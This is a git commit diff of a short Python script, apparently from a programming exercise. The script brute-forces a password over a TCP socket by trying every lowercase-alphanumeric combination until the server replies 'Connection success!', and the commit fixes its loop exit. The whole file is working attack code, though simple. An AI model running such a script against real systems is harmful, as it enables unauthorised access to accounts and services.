c289824ade24068cb76aa9256d9e172504a54ec8
Gavin Quirk <gavinquirk@gmail.com>
2020-08-18 15:44:06 -0700

    brute force successfull

--- hack.py
+++ hack.py
@@ -3,25 +3,24 @@ import socket
 import itertools
 
 
-characters = list('abcdefghijklmnopqrstuvwxyz0123456789')
-
-print(characters)
-
 host = sys.argv[1]
 port = int(sys.argv[2])
+characters = list('abcdefghijklmnopqrstuvwxyz0123456789')
+client_socket = socket.socket()
+address = (host, port)
+client_socket.connect(address)
+state = False
 
-with socket.socket() as client_socket:
-    address = (host, port)
-    client_socket.connect(address)
-
-    # 2 Generate possible password, encode and send
-    for i in range(1, len(characters) + 1):
-        for combination in itertools.product(characters, repeat=i):
-            password = "".join(combination)
-            client_socket.send(password.encode())
-            response = client_socket.recv(1024).decode()
-            if response == "Connection success!":
-                print(response)
-                break
+for i in range(1, len(characters) + 1):
+    for combination in itertools.product(characters, repeat=i):
+        password = "".join(combination)
+        client_socket.send(password.encode())
+        response = client_socket.recv(1024).decode()
+        if response == "Connection success!":
+            print(password)
+            state = True
+            break
+    if state:
+        break
 
 client_socket.close()
